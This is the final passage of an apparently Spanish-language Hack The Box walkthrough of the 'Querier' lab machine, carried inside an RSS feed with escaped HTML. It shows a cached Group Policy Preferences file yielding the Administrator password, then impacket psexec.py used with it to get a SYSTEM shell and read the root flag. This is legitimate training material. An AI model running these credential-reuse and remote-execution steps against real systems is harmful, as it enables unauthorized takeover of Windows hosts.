&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encrypted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;web&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encrypted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;application&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pool&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;virtual&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwords&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;plaintext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;passwords&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;McAfee&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SiteList&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;....&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cached&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Group &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Policy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Preferences&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;....&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;Changed&lt;/span&gt;   &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2019&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;01&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;28&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;UserNames&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;NewName&lt;/span&gt;   &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[BLANK]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Passwords&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MyUnclesAreMarioAndLuigi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;!!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;!}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;      &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ProgramData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Group &lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;Policy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;History&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;31B2F340&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;016D&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;11D2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;945F&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;00C04FB984F9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Machine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Preferences&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Groups&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al finalizar Nos encontramos que existe un archivo de &lt;code&gt;Groups Policy&lt;/code&gt; que contiene un Usuario y Contraseña, en este caso el de Administrator. Utilizando el script &lt;code&gt;psexec.py&lt;/code&gt; para conectarnos de manera remota con el Usuario Administrator y obtener una shell con &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python psexec.py -debug Administrator:&lt;span class=&#34;s1&#34;&gt;&amp;#39;MyUnclesAreMarioAndLuigi!!1!&amp;#39;&lt;/span&gt;@10.10.10.125

root@sckull:~/impacket/examples# python psexec.py -debug Administrator:&lt;span class=&#34;s1&#34;&gt;&amp;#39;MyUnclesAreMarioAndLuigi!!1!&amp;#39;&lt;/span&gt;@10.10.10.125
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; StringBinding ncacn_np:10.10.10.125&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;ipe&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vcctl&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Your pycrypto doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Download it from https://www.dlitz.net/software/pycrypto
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Requesting shares on 10.10.10.125.....
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Found writable share ADMIN$
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Uploading file WsaCFcep.exe
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Opening SVCManager on 10.10.10.125.....
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Creating service EOzc on 10.10.10.125.....
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Starting service EOzc.....
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Your pycrypto doesn&amp;#39;&lt;/span&gt;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
Download it from https://www.dlitz.net/software/pycrypto
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Press &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; extra shell commands
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Your pycrypto doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Download it from https://www.dlitz.net/software/pycrypto
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Your pycrypto doesn&amp;#39;&lt;/span&gt;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
Download it from https://www.dlitz.net/software/pycrypto
Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.17763.292&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; Microsoft Corporation. All rights reserved.

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;cd ..

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&amp;gt;cd C:&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;
C:&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; Users&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt;cd Desktop

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;dir
 Volume in drive C has no label.
 Volume Serial Number is FE98-F373

 Directory of C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop

01/29/2019  12:04 AM    &amp;lt;DIR&amp;gt;          .
01/29/2019  12:04 AM    &amp;lt;DIR&amp;gt;          ..
01/28/2019  12:08 AM                &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; root.txt
               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; File&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;             &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; bytes
               &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Dir&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;   5,970,571,264 bytes free

C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;more root.txt
b19c3794f786a1fdcf205f81497c3592
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/querier/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/querier/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>smbclient</category>
            
          
            
              <category>binwalk</category>
            
          
            
              <category>mssql</category>
            
          
            
              <category>impacket</category>
            
          
            
              <category>powerup</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>